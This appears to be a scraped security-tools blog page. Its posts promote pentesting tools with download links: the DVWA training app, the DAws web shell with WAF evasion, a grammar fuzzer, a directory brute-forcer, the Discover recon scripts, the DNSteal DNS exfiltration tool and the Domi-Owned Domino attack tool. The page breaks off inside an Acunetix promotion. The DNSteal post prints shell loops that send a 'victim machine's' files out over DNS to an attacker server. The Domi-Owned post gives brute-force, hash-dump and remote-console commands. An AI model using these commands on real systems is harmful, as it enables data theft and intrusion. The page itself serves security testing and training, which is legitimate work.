     <h1 class="post-title entry-title" itemprop="name headline"> Damn Vulnerable Web App - PHP/MySQL Training Web Application that is Damn Vulnerable  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-4554859158071750570" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://1.bp.blogspot.com/-EofcxXm4MdI/VWp-uZW9pzI/AAAAAAAAEJE/xezg4Tv5K-o/s1600/Damn%2BVulnerable%2BWeb%2BApp.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-EofcxXm4MdI/VWp-uZW9pzI/AAAAAAAAEJE/xezg4Tv5K-o/s1600/Damn%2BVulnerable%2BWeb%2BApp.png"></a>
      </div> 
      <br> 
      <div style="text-align: justify;">
        Damn Vulnerable Web App (DVWA) is a PHP/MySQL web application that is damn vulnerable. Its main goals are to be an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand the processes of securing web applications and aid teachers/students to teach/learn web application security in a class room environment.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <b>WARNING!</b>
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        Damn Vulnerable Web App is damn vulnerable! Do not upload it to your hosting provider's public html folder or any working web server as it will be hacked. I recommend downloading and installing XAMPP onto a local machine inside your LAN which is used solely for testing. 
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        We do not take responsibility for the way in which any one uses Damn Vulnerable Web App (DVWA). We have made the purposes of the application clear and it should not be used maliciously. We have given warnings and taken measures to prevent users from installing DVWA on to live web servers. If your web server is compromised via an installation of DVWA it is not our responsibility it is the responsibility of the person/s who uploaded and installed it.
      </div> 
      <br> 
      <br> 
      <div style="text-align: center;"> 
       <b><span style="font-size: x-large;"><a href="https://github.com/RandomStorm/DVWA" target="_blank">Download&nbsp;Damn Vulnerable Web App</a></span></b>
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="1624674955588710641" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> DAws - Advanced Web Shell (Windows/Linux)  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-1624674955588710641" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://1.bp.blogspot.com/-15eX1bOi0DA/VMlRH8hJb0I/AAAAAAAADnQ/n4N63f8vusQ/s1600/DAws.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-15eX1bOi0DA/VMlRH8hJb0I/AAAAAAAADnQ/n4N63f8vusQ/s1600/DAws.png" height="250" width="640"></a>
      </div> 
      <br> 
      <div style="text-align: justify;">
        There's multiple things that makes DAws better than every Web Shell out there:
      </div> 
      <ol class="task-list"> 
       <li style="text-align: justify;">Bypasses Disablers; DAws isn't just about using a particular function to get the job done, it uses up to 6 functions if needed, for example, if shell_exec was disabled it would automatically use exec or passthru or system or popen or proc_open instead, same for Downloading a File from a Link, if Curl was disabled then file_get_content is used instead and this Feature is widely used in every section and fucntion of the shell.</li> 
       <li style="text-align: justify;">Automatic Encoding; DAws randomly and automatically encodes most of your GET and POST data using XOR(Randomized key for every session) + Base64(We created our own Base64 encoding functions instead of using the PHP ones to bypass Disablers) which will allow your shell to Bypass pretty much every WAF out there.</li> 
       <li style="text-align: justify;">Advanced File Manager; DAws's File Manager contains everything a File Manager needs and even more but the main Feature is that everything is dynamically printed; the permissions of every File and Folder are checked, now, the functions that can be used will be available based on these permissions, this will save time and make life much easier.</li> 
       <li style="text-align: justify;">Tools: DAws holds bunch of useful tools such as "bpscan" which can identify useable and unblocked ports on the server within few minutes which can later on allow you to go for a bind shell for example.</li> 
       <li style="text-align: justify;">Everything that can't be used at all will be simply removed so Users do not have to waste their time. We're for example mentioning the execution of c++ scripts when there's no c++ compilers on the server(DAws would have checked for multiple compilers in the first place) in this case, the function would be automatically removed and the User would know.</li> 
       <li style="text-align: justify;">Supports Windows and Linux.</li> 
       <li style="text-align: justify;">Openned Source.</li> 
      </ol> 
      <div style="text-align: justify;"> 
      </div> 
      <a name="more"></a>
      <br> 
      <div style="text-align: justify;"> 
       <b><span style="font-size: large;">Extra Info </span></b>
      </div> 
      <ul class="task-list"> 
       <li style="text-align: justify;">Eval Form:</li> 
       <ul class="task-list"> 
        <li style="text-align: justify;">`include` is being used instead PHP `eval` to bypass Protection Systems.</li> 
       </ul> 
       <li style="text-align: justify;">Download from Link - Methods:</li> 
       <ul class="task-list"> 
        <li style="text-align: justify;">PHP Curl</li> 
        <li style="text-align: justify;">File_put_content</li> 
       </ul> 
       <li style="text-align: justify;">Zip - Methods:</li> 
       <ul class="task-list"> 
        <li style="text-align: justify;">Linux:</li> 
        <ul class="task-list"> 
         <li style="text-align: justify;">Zip</li> 
        </ul> 
        <li style="text-align: justify;">Windows:</li> 
        <ul class="task-list"> 
         <li style="text-align: justify;">Vbs Script</li> 
        </ul> 
       </ul> 
       <li style="text-align: justify;">Shells and Tools:</li> 
       <ul class="task-list"> 
        <li style="text-align: justify;">Extra:</li> 
        <ul class="task-list"> 
         <li style="text-align: justify;">`nohup`, if installed, is automatically used for background processing.</li> 
        </ul> 
       </ul> 
      </ul> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: center;"> 
       <b><span style="font-size: x-large;"><a href="https://github.com/dotcppfile/DAws" target="_blank">Download&nbsp;DAws</a></span></b>
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="1245165078856794635" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> Dharma - A generation-based, context-free grammar fuzzer  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-1245165078856794635" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://2.bp.blogspot.com/-zUvahL-Ofec/Va6-rtYD-JI/AAAAAAAAEaI/TOA6aV8I1Jc/s1600/dharma.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="470" src="http://2.bp.blogspot.com/-zUvahL-Ofec/Va6-rtYD-JI/AAAAAAAAEaI/TOA6aV8I1Jc/s640/dharma.png" width="640"></a>
      </div> A generation-based, context-free grammar fuzzer.
      <br> 
      <br> 
      <b><span style="font-size: large;"> Requirements</span></b>
      <br> 
      <br> None
      <br> 
      <a name="more"></a>
      <br> 
      <b><span style="font-size: large;"> <a aria-hidden="true" class="anchor" href="https://github.com/mozillasecurity/dharma#examples" id="user-content-examples"></a>Examples</span></b>
      <br> 
      <br> Generate a single test-case.
      <br> 
      <pre><code>% ./dharma.py -grammars grammars/webcrypto.dg
</code></pre> Generate a single test case with multiple grammars.
      <br> 
      <pre><code>% ./dharma.py -grammars grammars/canvas2d.dg grammars/mediarecorder.dg
</code></pre> Generating test-cases as files.
      <br> 
      <pre><code>% ./dharma.py -grammars grammars/webcrypto.dg -storage . -count 5
</code></pre> Generate test-cases, send each over WebSocket to Firefox, observe the process for crashes and bucket them.
      <br> 
      <pre><code>% ./dharma.py -server -grammars grammars/canvas2d.dg -template grammars/var/templates/html5/default.html
% ./framboise.py -setup inbound64-release -debug -worker 4 -testcase ~/dev/projects/fuzzers/dharma/grammars/var/index.html
</code></pre> Benchmark the generator.
      <br> 
      <pre><code>% time ./dharma.py -grammars grammars/webcrypto.dg -count 10000 &gt; /dev/null
</code></pre> 
      <br> 
      <b><span style="font-size: large;"> Grammar Cheetsheet</span></b>
      <br> 
      <br> 
      <b>Comment</b>
      <br> 
      <pre><code>%%% comment
</code></pre> 
      <br> 
      <b>Controls</b>
      <br> 
      <pre><code>%const% name := value
</code></pre> 
      <br> 
      <b>Sections</b>
      <br> 
      <pre><code>%section% := value
%section% := variable
%section% := variance
</code></pre> 
      <br> 
      <b>Extension methods</b>
      <br> 
      <pre><code>%range%(0-9)
%range%(0.0-9.0)
%range%(a-z)
%range%(!-~)
%range%(0x100-0x200)

%repeat%(+variable+)
%repeat%(+variable+, ", ")

%uri%(path)
%uri%(lookup_key)

%block%(path)

%choice%(foo, "bar", 1)
</code></pre> 
      <br> 
      <b>Assigning values</b>
      <br> 
      <pre><code>digit :=
    %range%(0-9)

sign :=
    +
    -

value :=
    +sign+%repeat%(+digit+)
</code></pre> 
      <br> 
      <b>Using values</b>
      <br> 
      <pre><code>+value+
</code></pre> 
      <br> 
      <b>Assigning variables</b>
      <br> 
      <pre><code>variable :=
    @<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="215740534840434d4461">[email&nbsp;protected]</a> = new Foo();
</code></pre> 
      <br> 
      <b>Using variables</b>
      <br> 
      <pre><code>value :=
    !variable!.bar();
</code></pre> 
      <br> 
      <b>Referencing values from common.dg</b>
      <br> 
      <pre><code>value :=
    attribute=+common:number+
</code></pre> 
      <br> 
      <b>Calling javascript library functions</b>
      <br> 
      <pre><code>foo :=
    Random.pick([0,1]);
</code></pre> 
      <br> 
      <br> 
      <div style="text-align: center;"> 
       <b><span style="font-size: x-large;"><a href="https://github.com/mozillasecurity/dharma" target="_blank">Download&nbsp;Dharma</a></span></b>
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="5861578857326156903" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> Dirs3arch v0.3.0 - HTTP(S) Directory/File Brute Forcer  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-5861578857326156903" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://3.bp.blogspot.com/-JBJr2Whoz8c/VNZtSgnbNaI/AAAAAAAADqc/-vOhkxMk0QE/s1600/dirs3arch_v0.3.0.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-JBJr2Whoz8c/VNZtSgnbNaI/AAAAAAAADqc/-vOhkxMk0QE/s1600/dirs3arch_v0.3.0.png" height="284" width="640"></a>
      </div> 
      <br> 
      <div style="text-align: justify;">
        dirs3arch is a simple command line tool designed to brute force hidden directories and files in websites.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        It's written in python3 3 and all thirdparty libraries are included.
      </div> 
      <a name="more"></a>
      <br> 
      <div style="text-align: justify;"> 
       <span style="font-size: large;"><b>Operating Systems supported</b></span>
      </div> 
      <ul> 
       <li style="text-align: justify;">Windows XP/7/8</li> 
       <li style="text-align: justify;">GNU/Linux</li> 
       <li style="text-align: justify;">MacOSX</li> 
      </ul> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <b><span style="font-size: large;">Features</span></b>
      </div> 
      <ul> 
       <li style="text-align: justify;">Multithreaded</li> 
       <li style="text-align: justify;">Keep alive connections</li> 
       <li style="text-align: justify;">Support for multiple extensions (-e|--extensions asp,php)</li> 
       <li style="text-align: justify;">Reporting (plain text, JSON)</li> 
       <li style="text-align: justify;">Detect not found web pages when 404 not found errors are masked (.htaccess, web.config, etc).</li> 
       <li style="text-align: justify;">Recursive brute forcing</li> 
       <li style="text-align: justify;">HTTP(S) proxy support</li> 
       <li style="text-align: justify;">Batch processing (-L)</li> 
      </ul> 
      <br> 
      <b><span style="font-size: large;">Examples</span></b>
      <br> 
      <ul> 
       <li><strong>Scan www.example.com/admin/ to find php files:</strong> <br><pre><code>python3 dirs3arch.py -u http://www.example.com/admin/ -e php</code></pre> </li> 
       <li><strong>Scan www.example.com to find asp and aspx files with SSL:</strong><br> <pre><code>python3 dirs3arch.py -u https://www.example.com/ -e asp,aspx</code></pre> </li> 
       <li><strong>Scan www.example.com with an alternative dictionary (from DirBuster):</strong><br> <pre><code>python3 dirs3arch.py -u http://www.example.com/ -e php -w db/dirbuster/directory-list-2.3-small.txt</code></pre> </li> 
       <li><strong>Scan with HTTP proxy (localhost port 8080):</strong><br> <pre><code>python3 dirs3arch.py -u http://www.example.com/admin/ -e php --http-proxy localhost:8080</code></pre> </li> 
       <li><strong>Scan with custom User-Agent and custom header (Referer):</strong><br> <pre><code>python3 dirs3arch.py -u http://www.example.com/admin/ -e php --user-agent "My User-Agent" --header "Referer: www.google.com"</code></pre> </li> 
       <li><strong>Scan recursively:</strong><br> <pre><code>python3 dirs3arch.py -u http://www.example.com/admin/ -e php -r</code></pre> </li> 
       <li><strong>Scan recursively excluding server-status directory and 200 status codes:</strong><br> <pre><code>python3 dirs3arch.py -u http://www.example.com/ -e php -r --exclude-subdir "server-status" --exclude-status 200</code></pre> </li> 
       <li><strong>Scan includes, classes directories in /admin/</strong><br> <pre><code>python3 dirs3arch.py -u http://www.example.com/admin/ -e php --scan-subdir "includes, classes"</code></pre> </li> 
       <li><strong>Scan without following HTTP redirects:</strong><br> <pre><code>python3 dirs3arch.py -u http://www.example.com/ -e php --no-follow-redirects</code></pre> </li> 
       <li><strong>Scan VHOST "backend" at IP 192.168.1.1:</strong><br> <pre><code>python3 dirs3arch.py -u http://backend/ --ip 192.168.1.1</code></pre> </li> 
       <li><strong>Scan <a href="http://www.example.com/">www.example.com</a> to find wordpress plugins:</strong><br> <pre><code>python3 dirs3arch.py -u http://www.example.com/wordpress/wp-content/plugins/ -e php -w db/wordpress/plugins.txt</code></pre> <br> </li> 
       <li><strong>Batch processing:</strong><br> <pre><code>python3 dirs3arch.py -L urllist.txt -e php</code></pre> <br> </li> 
      </ul> 
      <br> 
      <div style="text-align: justify;"> 
       <b><span style="font-size: large;">Thirdparty code</span></b>
      </div> 
      <ul> 
       <li style="text-align: justify;">colorama</li> 
       <li style="text-align: justify;">oset</li> 
       <li style="text-align: justify;">urllib3</li> 
       <li style="text-align: justify;">sqlmap</li> 
      </ul> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <b><span style="font-size: large;">Changelog</span></b>
      </div> 
      <ul> 
       <li style="text-align: justify;">0.3.0 - 2015.2.5 Fixed issue3, fixed timeout exception, ported to python33, other bugfixes</li> 
       <li style="text-align: justify;">0.2.7 - 2014.11.21 Added Url List feature (-L). Changed output. Minor Fixes</li> 
       <li style="text-align: justify;">0.2.6 - 2014.9.12 Fixed bug when dictionary size is greater than threads count. Fixed URL encoding bug (issue2).</li> 
       <li style="text-align: justify;">0.2.5 - 2014.9.2 Shows Content-Length in output and reports, added default.conf file (for setting defaults) and report auto save feature added.</li> 
       <li style="text-align: justify;">0.2.4 - 2014.7.17 Added Windows support, --scan-subdir|--scan-subdirs argument added, --exclude-subdir|--exclude-subdirs added, --header argument added, dirbuster dictionaries added, fixed some concurrency bugs, MVC refactoring</li> 
       <li style="text-align: justify;">0.2.3 - 2014.7.7 Fixed some bugs, minor refactorings, exclude status switch, "pause/next directory" feature, changed help structure, expaded default dictionary</li> 
       <li style="text-align: justify;">0.2.2 - 2014.7.2 Fixed some bugs, showing percentage of tested paths and added report generation feature</li> 
       <li style="text-align: justify;">0.2.1 - 2014.5.1 Fixed some bugs and added recursive option</li> 
       <li style="text-align: justify;">0.2.0 - 2014.1.31 Initial public release</li> 
      </ul> 
      <div> 
       <div style="text-align: justify;"> 
        <br>
       </div> 
      </div> 
      <div> 
       <div style="text-align: center;"> 
        <b><span style="font-size: x-large;"><a href="https://github.com/maurosoria/dirs3arch" target="_blank">Download&nbsp;Dirs3arch</a></span></b>
       </div> 
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="8948725026687222999" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> Discover - Custom bash scripts used to automate various pentesting tasks  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-8948725026687222999" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://1.bp.blogspot.com/-lbOm20tn1Hs/Ves5gQedYCI/AAAAAAAAElE/1vCImbRamuk/s1600/discover.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="540" src="http://1.bp.blogspot.com/-lbOm20tn1Hs/Ves5gQedYCI/AAAAAAAAElE/1vCImbRamuk/s640/discover.png" width="640"></a>
      </div> 
      <br> For use with Kali Linux. Custom bash scripts used to automate various pentesting tasks.
      <br> 
      <br> 
      <span style="font-size: large;"><b>Download, setup &amp; usage</b></span>
      <br> 
      <ul> 
       <li>git clone git://github.com/leebaird/discover.git /opt/discover/</li> 
       <li>All scripts must be ran from this location.</li> 
       <li>cd /opt/discover/</li> 
       <li>./setup.sh</li> 
       <li>./discover.sh</li> 
      </ul> 
      <pre><code>RECON
1.  Domain
2.  Person
3.  Parse salesforce

SCANNING
4.  Generate target list
5.  CIDR
6.  List
7.  IP or domain

WEB
8.  Open multiple tabs in Iceweasel
9.  Nikto
10. SSL

MISC
11. Crack WiFi
12. Parse XML
13. Start a Metasploit listener
14. Update
15. Exit
</code></pre> 
      <br> 
      <span style="font-size: large;"><b>RECON</b></span>
      <br> 
      <br> 
      <b>Domain</b>
      <br> 
      <pre><code>RECON

1.  Passive
2.  Active
3.  Previous menu
</code></pre> 
      <ul> 
       <li>Passive combines goofile, goog-mail, goohost, theHarvester, Metasploit, dnsrecon, URLCrazy, Whois and multiple webistes.</li> 
       <li>Active combines Nmap, dnsrecon, Fierce, lbd, WAF00W, traceroute and Whatweb.</li> 
      </ul> 
      <b><br></b> 
      <b>Person</b>
      <br> 
      <pre><code>RECON

First name:
Last name:
</code></pre> 
      <ul> 
       <li>Combines info from multiple websites.</li> 
      </ul> 
      <b><br></b> 
      <b>Parse salesforce</b>
      <br> 
      <pre><code>Create a free account at salesforce (https://connect.data.com/login).
Perform a search on your target company &gt; select the company name &gt; see all.
Copy the results into a new file.

Enter the location of your list: 
</code></pre> 
      <ul> 
       <li>Gather names and positions into a clean list.</li> 
      </ul> 
      <b><br></b> 
      <span style="font-size: large;"><b>SCANNING</b></span>
      <br> 
      <br> 
      <b>Generate target list</b>
      <br> 
      <pre><code>SCANNING

1.  Local area network
2.  NetBIOS
3.  netdiscover
4.  Ping sweep
5.  Previous menu
</code></pre> 
      <ul> 
       <li>Use different tools to create a target list including Angry IP Scanner, arp-scan, netdiscover and nmap pingsweep.</li> 
      </ul> 
      <br> 
      <b>CIDR, List, IP or domain</b>
      <br> 
      <pre><code>Type of scan: 

1.  External
2.  Internal
3.  Previous menu
</code></pre> 
      <ul> 
       <li>External scan will set the nmap source port to 53 and the max-rrt-timeout to 1500ms.</li> 
       <li>Internal scan will set the nmap source port to 88 and the max-rrt-timeout to 500ms.</li> 
       <li>Nmap is used to perform host discovery, port scanning, service enumeration and OS identification. </li> 
       <li>Matching nmap scripts are used for additional enumeration.</li> 
       <li>Matching Metasploit auxiliary modules are also leveraged.</li> 
      </ul> 
      <br> 
      <span style="font-size: x-large;"><b>WEB</b></span>
      <br> 
      <br> 
      <b>Open multiple tabs in Icewease</b>
      <br> 
      <pre><code>Open multiple tabs in Iceweasel with:

1.  List
2.  Directories from a domain's robot.txt.
3.  Previous menu
</code></pre> 
      <ul> 
       <li>Use a list containing IPs and/or URLs.</li> 
       <li>Use wget to pull a domain's robot.txt file, then open all of the directories.</li> 
      </ul> 
      <b><br></b> 
      <b>Nikto</b>
      <br> 
      <pre><code>Run multiple instances of Nikto in parallel.

1.  List of IPs.
2.  List of IP:port.
3.  Previous menu
</code></pre> 
      <br> 
      <b>SSL</b>
      <br> 
      <pre><code>Check for SSL certificate issues.

Enter the location of your list: 
</code></pre> 
      <ul> 
       <li>Use sslscan and sslyze to check for SSL/TLS certificate issues.</li> 
      </ul> 
      <br> 
      <span style="font-size: large;"><b>MISC</b></span>
      <br> 
      <br> 
      <b>Crack WiFi</b>
      <br> 
      <ul> 
       <li>Crack wireless networks.</li> 
      </ul> 
      <br> 
      <b>Parse XML</b>
      <br> 
      <pre><code>Parse XML to CSV.

1.  Burp (Base64)
2.  Nessus
3.  Nexpose
4.  Nmap
5.  Qualys
6.  Previous menu
</code></pre> 
      <br> 
      <b>Start a Metasploit listener</b>
      <br> 
      <ul> 
       <li>Setup a multi/handler with a windows/meterpreter/reverse_tcp payload on port 443.</li> 
      </ul> 
      <br> 
      <b>Update</b>
      <br> 
      <ul> 
       <li>Use to update Kali Linux, Discover scripts, various tools and the locate database.</li> 
      </ul> 
      <br> 
      <br> 
      <div style="text-align: center;"> 
       <a href="https://github.com/leebaird/discover" target="_blank"><span style="font-size: x-large;"><b>Download Discover</b></span></a>
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="1913984219067314417" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> DNSteal - DNS Exfiltration tool for stealthily sending files over DNS requests  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-1913984219067314417" itemprop="articleBody"> 
      <div style="text-align: justify;">
        This is a fake DNS server that allows you to stealthily extract files from a victim machine through DNS requests. 
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        Below is an image showing an example of how to use:
      </div> 
      <br> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://3.bp.blogspot.com/-6iaYD_m7c-Y/Vgg-TNFcd8I/AAAAAAAAEpY/xS_P6gBXMlg/s1600/DNSteal.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="222" src="http://3.bp.blogspot.com/-6iaYD_m7c-Y/Vgg-TNFcd8I/AAAAAAAAEpY/xS_P6gBXMlg/s640/DNSteal.png" width="640"></a>
      </div> 
      <a name="more"></a>
      <br> On the victim machine, you simply can do something like so:
      <br> 
      <div> 
       <pre><code>for b in $(xxd -p file/to/send.png); do dig @server $b.filename.com; done</code></pre> 
      </div> 
      <strong>Support for multiple files</strong>
      <br> 
      <div> 
       <pre><code>for filename in $(ls); do for b in $(xxd -p $f); do dig +short @server %b.$filename.com; done; done</code></pre> 
      </div> 
      <strong>gzip compression supported</strong>
      <br> It also supports compression of the file to allow for faster transfer speeds, this can be achieved using the "-z" switch:
      <br> 
      <div> 
       <pre><code>python dnsteal.py 127.0.0.1 -z</code></pre> 
      </div> Then on the victim machine send a Gzipped file like so:
      <br> 
      <div> 
       <pre><code>for b in $(gzip -c file/to/send.png | xxd -p); do dig @server $b.filename.com; done</code></pre> 
      </div> or for multiple, gzip compressed files:
      <br> 
      <div> 
       <pre><code>for filename in $(ls); do for b in $(gzip -c $filename | xxd -p); do dig +short @server %b.$filename.com; done; done</code></pre> 
      </div> 
      <br> 
      <br> 
      <div style="text-align: center;"> 
       <b><span style="font-size: x-large;"><a href="https://github.com/m57/dnsteal" target="_blank">Download&nbsp;DNSteal</a></span></b>
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="4692148251446831869" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> Domi-Owned - Tool Used for Compromising IBM/Lotus Domino Servers  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-4692148251446831869" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://2.bp.blogspot.com/-ty8_6f7mkH0/Vm3eIISID7I/AAAAAAAAE70/odgIu9P3Tvk/s1600/IBM_Lotus.PNG" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-ty8_6f7mkH0/Vm3eIISID7I/AAAAAAAAE70/odgIu9P3Tvk/s1600/IBM_Lotus.PNG"></a>
      </div> 
      <br> Domi-Owned is a tool used for compromising IBM/Lotus Domino servers. 
      <br> Tested on IBM/Lotus Domino 8.5.2, 8.5.3, 9.0.0, and 9.0.1 running on Windows and Linux.
      <br> 
      <h2> Usage</h2> A valid username and password is not required unless 'names.nsf' and/or 'webadmin.nsf' requires authentication.
      <br> 
      <h3> Fingerprinting</h3> Running Domi-Owned with just the 
      <br> 
      <pre><code>--url</code></pre> flag will attempt to identify the Domino server version, as well as check if 'names.nsf' and 'webadmin.nsf' requires authentication.
      <br> If a username and password is given, Domi-Owned will check to see if that account can access 'names.nsf' and 'webadmin.nsf' with those credentials.
      <br> 
      <h3> Reverse Bruteforce</h3> To perform a Reverse Bruteforce attack against a Domino server, specify a file containing a list of usernames with 
      <br> 
      <pre><code>-U</code></pre> , a password with 
      <br> 
      <pre><code>-p</code></pre> , and the 
      <br> 
      <pre><code>--bruteforce</code></pre> flag. Domi-Owned will then try to authenticate to 'names.nsf', returning successful accounts.
      <br> 
      <h3> Dump Hashes</h3> To dump all Domino accounts with a 
      <strong>non-empty</strong> hash from 'names.nsf', run Domi-Owned with the 
      <br> 
      <pre><code>--hashdump</code></pre> flag. This prints the results to the screen and writes them to separate out files depending on the hash type (Domino 5, Domino 6, Domino 8).
      <br> 
      <h3> Quick Console</h3> The Domino Quick Console is active by default; however, it will not show the command's output. A work around to this problem is to redirect the command output to a file, in this case 'log.txt', that is then displayed as a web page on the Domino server.
      <br> If the 
      <br> 
      <pre><code>--quickconsole</code></pre> flag is given, Domi-Owned will access the Domino Quick Console, through 'webadmin.nsf', allowing the user to issue native Windows or Linux commands. Domi-Owned will then retrieve the output of the command and display the results in real time, through a command line interpreter. Type 
      <br> 
      <pre><code>exit</code></pre> to quit the Quick Console interpreter, which will also delete the 'log.txt' output file.
      <br> 
      <h2> Examples</h2> 
      <h4> Fingerprint Domino server</h4> 
      <pre><code>python domi-owned.py --url http://domino-server.com</code></pre> 
      <br> 
      <h4> Preform a reverse bruteforce attack</h4> 
      <pre><code>python domi-owned.py --url http://domino-server.com -U ./usernames.txt -p password --bruteforce</code></pre> 
      <br> 
      <h4> Dump Domino account hashes</h4> 
      <pre><code>python domi-owned.py --url http://domino-server.com -u user -p password --hashdump</code></pre> 
      <br> 
      <h4> Interact with the Domino Quick Console</h4> 
      <pre><code>python domi-owned.py --url http://domino-server.com -u user -p password --quickconsole</code></pre> 
      <br> 
      <b><br></b> 
      <div style="text-align: center;"> 
       <b><span style="font-size: x-large;"><a href="https://github.com/coldfusion39/domi-owned" target="_blank">Download&nbsp;Domi-Owned</a></span></b>
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="4668534842215578825" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> Double the bang for your buck with Acunetix Vulnerability Scanner  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-4668534842215578825" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://4.bp.blogspot.com/-eeKHM2jxEF4/VUvU9mpz2MI/AAAAAAAAD-k/49mgM5twAaw/s1600/acunetix.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="306" src="http://4.bp.blogspot.com/-eeKHM2jxEF4/VUvU9mpz2MI/AAAAAAAAD-k/49mgM5twAaw/s640/acunetix.jpg" width="640"></a>
      </div> 
      <br> 
      <div style="text-align: justify;">
        Acunetix have announced that they are extending their current free offering of the network security scan, part of their cloud-based web and network vulnerability scanner. Those signing up for a trial of the online version of Acunetix vulnerability scanner will now be able to scan their perimeter servers for network security issues on up to 3 targets with no expiry.
      </div> 
      <div style="text-align: justify;"> 
       <br> In addition, existing Acunetix customers will also be able to double up on their current license-based quota of scan targets by adding the same amount of network scans. i.e a 25 scan target license can now make use of an extra 25 network-only scan targets for free.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        An analysis of scans performed over the past year following the launch of Acunetix Vulnerability Scanner (online version) show that on average 50% of the targets scanned have a medium or high network security vulnerability. It’s worrying that in the current cybersecurity climate, network devices remain vulnerable to attack. The repercussions of a vulnerable network are catastrophic as seen in some recent, well publicised Lizard Squad attacks, the black hat hacking group, mainly known for their claims of DoS attacks.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        “Acunetix secure the websites of some of the biggest global enterprises, and with our online vulnerability scanner we are not only bringing this technology within reach of many more businesses but we are also providing free network security scanning technology to aid smaller companies secure their network,” said Nick Galea, CEO of Acunetix.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <b><span style="font-size: large;">How Acunetix keeps perimeter servers secure</span></b>
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        A network security scan checks the perimeter servers, locating any vulnerabilities in the operating system, server software, network services and protocols. Acunetix network security scan uses the OpenVAS database of network vulnerabilities and scans for more than 35,000 network level vulnerabilities. A network scan is where vulnerabilities such as Shellshock, Heartbleed and POODLE are detected, vulnerabilities which continue to plague not only web servers but also a large percentage of other network servers. A network scan will also:
      </div> 
      <div style="text-align: justify;"> 
      </div> 
      <ul> 
       <li style="text-align: justify;">Detect misconfigurations and vulnerabilities in OS, server applications, network services, and protocols</li> 
       <li style="text-align: justify;">Assess security of detected devices (routers, hardware firewalls, switches and printers)</li> 
       <li style="text-align: justify;">Scan for trojans, backdoors, rootkits, and other malware that can be detected remotely</li> 
